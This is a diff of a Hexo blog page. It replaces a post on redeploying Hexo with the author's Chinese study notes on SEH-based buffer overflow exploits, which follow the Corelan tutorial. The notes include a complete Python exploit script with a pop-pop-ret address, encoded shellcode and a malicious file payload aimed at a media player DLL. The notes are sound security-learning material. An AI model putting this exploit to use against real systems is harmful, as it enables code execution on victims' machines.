@@ -20,20 +20,22 @@
     var CONFIG = {"hostname":"finsenty54.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":320,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了 1. 前期准备hexo安装遵循该页面进行git和nodejs的安装将之前的hexo文件整个拷贝过来">
-<meta name="keywords" content="else">
+  <meta name="description" content="PWN学习Exploit writing tutorial part 3 : SEH Based Exploits">
+<meta name="keywords" content="PWN">
 <meta property="og:type" content="article">
-<meta property="og:title" content="在新电脑上重新部署hexo">
-<meta property="og:url" content="http://finsenty54.github.io/2019/11/19/在新电脑上重新部署hexo/index.html">
+<meta property="og:title" content="SEH">
+<meta property="og:url" content="http://finsenty54.github.io/2020/09/21/SEH/index.html">
 <meta property="og:site_name" content="FINSENTY54">
-<meta property="og:description" content="近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了 1. 前期准备hexo安装遵循该页面进行git和nodejs的安装将之前的hexo文件整个拷贝过来">
+<meta property="og:description" content="PWN学习Exploit writing tutorial part 3 : SEH Based Exploits">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-11-19T06:19:51.580Z">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/21/wq8cwV.png">
+<meta property="og:updated_time" content="2020-09-21T14:25:59.079Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="在新电脑上重新部署hexo">
-<meta name="twitter:description" content="近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了 1. 前期准备hexo安装遵循该页面进行git和nodejs的安装将之前的hexo文件整个拷贝过来">
+<meta name="twitter:title" content="SEH">
+<meta name="twitter:description" content="PWN学习Exploit writing tutorial part 3 : SEH Based Exploits">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/09/21/wq8cwV.png">
 
-<link rel="canonical" href="http://finsenty54.github.io/2019/11/19/在新电脑上重新部署hexo/">
+<link rel="canonical" href="http://finsenty54.github.io/2020/09/21/SEH/">
 
 
 <script id="page-configurations">
@@ -46,7 +48,7 @@
   };
 </script>
 
-  <title>在新电脑上重新部署hexo | FINSENTY54</title>
+  <title>SEH | FINSENTY54</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-135283153-1"></script>
     <script>
@@ -207,7 +209,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2019/11/19/在新电脑上重新部署hexo/">
+    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2020/09/21/SEH/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -220,7 +222,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          在新电脑上重新部署hexo
+          SEH
         </h1>
 
         <div class="post-meta">
@@ -231,7 +233,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2019-11-19 11:31:43 / 修改时间：14:19:51" itemprop="dateCreated datePublished" datetime="2019-11-19T11:31:43+08:00">2019-11-19</time>
+              <time title="创建时间：2020-09-21 22:25:04 / 修改时间：22:25:59" itemprop="dateCreated datePublished" datetime="2020-09-21T22:25:04+08:00">2020-09-21</time>
             </span>
 
           
@@ -250,8 +252,8 @@
       </span>
       <span class="post-meta-item-text">Disqus：</span>
     
-    <a title="disqus" href="/2019/11/19/在新电脑上重新部署hexo/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/11/19/在新电脑上重新部署hexo/" itemprop="commentCount"></span>
+    <a title="disqus" href="/2020/09/21/SEH/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/09/21/SEH/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -266,27 +268,49 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了</p>
-<h4 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h4><p><a href="https://hexo.io/docs/" title="hexo安装" target="_blank" rel="noopener">hexo安装</a>遵循该页面进行<strong>git</strong>和<strong>nodejs</strong>的安装<br><code>将之前的hexo文件整个拷贝过来</code><br><a id="more"></a></p>
-<h4 id="2-配置SSH"><a href="#2-配置SSH" class="headerlink" title="2. 配置SSH"></a>2. 配置SSH</h4><p>生成rsa公私钥</p>
-<pre><code>$ cd ~/.ssh
-# Checks to see if there is a directory named &quot;.ssh&quot; in your user directory
+        <h2 id="PWN学习"><a href="#PWN学习" class="headerlink" title="PWN学习"></a>PWN学习</h2><h4 id="Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><a href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits" class="headerlink" title="Exploit writing tutorial part 3 : SEH Based Exploits"></a><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits" target="_blank" rel="noopener">Exploit writing tutorial part 3 : SEH Based Exploits</a></h4><a id="more"></a>
+<p><img src="https://s1.ax1x.com/2020/09/21/wq8cwV.png" alt="wq8cwV.png"><br>1st exception occurs :<br> |<br> ————————— (1)<br>                            |<br>                     ——-+————– (3) opcode in next SEH : jump over SE Handler to the shellcode<br>                     |      |             |<br>                     |      V             V<br>[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]<br>                opcode to   do                 (3) Shellcode gets executed<br>                jump over   pop pop ret<br>                SE Handler   |<br>                ^            |<br>                |            |<br>                ————– (2) will ‘pretend’ there’s a second exception, puts address of next SEH location in EIP, so opcode gets executed</p>
+<p>当一个异常触发时，会建立自己的栈，push EH Handler的参数，在ESP+8处的EstablisherFrame指向下一个SEH，在这里写pop pop ret的地址</p>
+<p>the <code>first pop</code> will take off<code>4 bytes</code> from the stack<br>the <code>second pop</code> will take another<code>4 bytes</code>from the stack<br>the <code>ret</code> will take the<code>current value</code>from the top of ESP ( = the address of the next SEH, which was at<code>ESP+8</code>, but because of the 2 pop’s now sits at the top of the stack) and puts that in <code>EIP</code>.</p>
+<h5 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h5><p>ollydbg VIEW-SEH CHAIN</p>
+<h5 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h5><p><code>msf-pattern_create -l 5000</code><br>产生一个序列，用于定位溢出点</p>
+<p>msf5 &gt; msfpescan -p Player.dll | grep -v “000”<br>寻找pop pop ret 命令地址 -v 不匹配“000”</p>
+<p>int 3 指令（0xcc） 中断指令</p>
+<pre><code>import struct
 
-$ ssh-keygen -t rsa -C &quot;your_email@example.com&quot;
-# Creates a new ssh key using the provided email
-Generating public/private rsa key pair.
-Enter file in which to save the key (/home/you/.ssh/id_rsa):
-</code></pre><p>然后在GitHub里添加公钥，在项目的setting里有一<code>deploy key</code>，在这里添加公钥<br>使用下列命令验证</p>
-<pre><code>ssh -T git@github.com
-</code></pre><p>如果不行，就是没有在<code>.ssh</code>文件夹里创建，需要接下来的两步</p>
-<pre><code>ssh-agent -s
-ssh-add ~/.ssh/id_rsa
-</code></pre><p>若提示要输入密码什么的，则在<code>_config.yml</code>配置文件中修改<code>repo</code></p>
-<pre><code>deploy:
-  type: git
-  repo: git@github.com:chengjianhua/chengjianhua.github.io.git
-  branch: master
-</code></pre><p>这样就可以了，不用<code>npm install</code>或<code>initial</code></p>
+uitext = &quot;ui_exploit.txt&quot;
+junk = &quot;\x41&quot; * 584
+seh_next = &quot;\xeb\x04\x90\x90&quot;
+seh_handler = str(struct.pack(&apos;&lt;L&apos;, 0x10018de8))
+shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot; +\
+            &quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot; +\
+            &quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot; +\
+            &quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot; +\
+            &quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot; +\
+            &quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot; +\
+            &quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot; +\
+            &quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot; +\
+            &quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot; +\
+            &quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot; +\
+            &quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot; +\
+            &quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot; +\
+            &quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot; +\
+            &quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot; +\
+            &quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot; +\
+            &quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot; +\
+            &quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot; +\
+            &quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot; +\
+            &quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot; +\
+            &quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot; +\
+            &quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot; +\
+            &quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;
+junk2 = &quot;\x90&quot; * 1000
+fp = open(uitext, &apos;w&apos;)
+content = junk + seh_next + seh_handler + shellcode + junk2
+fp.write(content)
+fp.close()
+</code></pre><p>总结：<br>SEH链条结构及其在栈中的位置<br>Windows XP SP1添加的XOR和SafeSEH保护机制<br>通过msf的msfpescan从dll中查找带有想要操作的函数（“POP POP RET”）<br>RET操作作为exploit方式的优缺点<br>通过<code>windbg</code>的”!analyze -v“ 和“!exchain”命令查看current SEH指针内容<br>windbg：d eip ; !exchain命令 ；u 地址 ；g 运行</p>
+<p>frog 青蛙</p>
 
     </div>
 
@@ -316,7 +340,7 @@ ssh-add ~/.ssh/id_rsa
       <footer class="post-footer">
           
           <div class="post-tags">
-              <a href="/tags/else/" rel="tag"><i class="fa fa-tag"></i> else</a>
+              <a href="/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
           </div>
 
         
@@ -325,13 +349,10 @@ ssh-add ~/.ssh/id_rsa
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2019/05/17/sql-more-details/" rel="prev" title="burpsuite 安全学院笔记">
-      <i class="fa fa-chevron-left"></i> burpsuite 安全学院笔记
+    <a href="/2020/08/18/RCE 初探/" rel="prev" title="RCE 初探">
+      <i class="fa fa-chevron-left"></i> RCE 初探
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2019/11/19/《逆向工程核心原理》学习笔记1/" rel="next" title="《逆向工程核心原理》学习笔记1">
-      《逆向工程核心原理》学习笔记1 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -397,7 +418,7 @@ ssh-add ~/.ssh/id_rsa
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-前期准备"><span class="nav-number">1.</span> <span class="nav-text">1. 前期准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-配置SSH"><span class="nav-number">2.</span> <span class="nav-text">2. 配置SSH</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN学习"><span class="nav-number">1.</span> <span class="nav-text">PWN学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><span class="nav-number">1.0.1.</span> <span class="nav-text">Exploit writing tutorial part 3 : SEH Based Exploits</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SEH链"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">SEH链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pattern"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">pattern</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -542,9 +563,9 @@ ssh-add ~/.ssh/id_rsa
 </script>
 <script>
   var disqus_config = function() {
-    this.page.url = "http://finsenty54.github.io/2019/11/19/在新电脑上重新部署hexo/";
-    this.page.identifier = "2019/11/19/在新电脑上重新部署hexo/";
-    this.page.title = "在新电脑上重新部署hexo";
+    this.page.url = "http://finsenty54.github.io/2020/09/21/SEH/";
+    this.page.identifier = "2020/09/21/SEH/";
+    this.page.title = "SEH";
     };
   NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
     if (window.DISQUS) {
